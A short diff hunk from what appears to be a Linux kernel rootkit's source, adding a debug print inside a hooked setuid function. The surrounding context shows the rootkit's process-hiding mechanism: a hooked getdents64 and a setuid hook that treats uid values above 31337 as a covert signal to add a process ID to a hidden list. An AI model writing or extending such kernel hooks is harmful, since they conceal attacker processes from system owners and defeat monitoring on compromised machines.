@@ -149,6 +149,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 /* This is used for interfacing with the rootkit to hide processes. */
 
 asmlinkage int hacked_setuid(uid_t uid){
+	printk("test\n");
 	if(uid > 31337){
 		sprintf(hidden_PIDs[index++], "%d", (uid - 31337));
 		printk("PID = %d\n", (uid - 31337));
